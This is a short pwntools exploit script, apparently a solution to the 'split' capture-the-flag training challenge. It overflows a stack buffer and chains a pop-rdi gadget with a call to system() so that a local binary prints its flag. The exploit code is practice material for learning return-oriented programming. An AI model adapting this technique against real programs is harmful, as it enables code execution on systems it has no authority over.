from pwn import *
import os

os.environ["SHELL"] = "/bin/sh"

context.binary = elf = ELF("./split")
context.arch = "amd64"
context.os = "linux"
context.terminal = ['st', '--', '/bin/sh', '-c']

# chain of instructions: mov edi, <argument> -> call system;

offset = cyclic_find(0x6161616c6161616b)


cat_flag = 0x601060

r_ret = 0x40053e

pop_rdi = 0x4007c3

call_system = 0x40074b

find_offset = cyclic(200) 

payload = b'a' * offset + p64(pop_rdi) + p64(cat_flag) + p64(call_system)

gdb_script = '''
    break *0x400735
    continue
'''

#io = gdb.debug(elf.path, gdbscript = gdb_script)
io = elf.process()

pause()

io.sendline(payload)

print("[+] Launching Binary: ")
print(io.recv().decode())

pause()
print("[+] FLAG: ")
print(io.recv().decode())

